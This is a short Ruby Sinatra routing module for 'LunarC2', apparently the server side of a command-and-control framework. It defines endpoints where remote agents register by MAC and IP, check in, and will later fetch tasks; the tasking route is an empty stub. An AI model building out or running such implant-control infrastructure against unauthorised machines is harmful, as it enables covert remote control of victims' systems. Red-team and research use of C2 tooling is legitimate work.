module Sinatra
	module LunarC2
		module Routing
			module C2
				def self.registered(app) 

					app.post '/c2/initial' do
						if not @agent = Agent.first(mac: params[:mac])
							@agent = Agent.create(mac: params[:mac], last_ip: params[:ip])
						end
						jbuilder :initial_json
					end

					app.get '/c2/checkin/:id' do
						@agent = Agent.first(id: params[:id])
						if not @agent.nil?
							@task_cnt = Task.count( open: true, agent: @agent )
							jbuilder :checkin_json
						else
							@path = request.path_info
							jbuilder :error_json
						end
					end

					app.get '/c2/tasking/:id' do

					end

				end
			end
		end
	end
end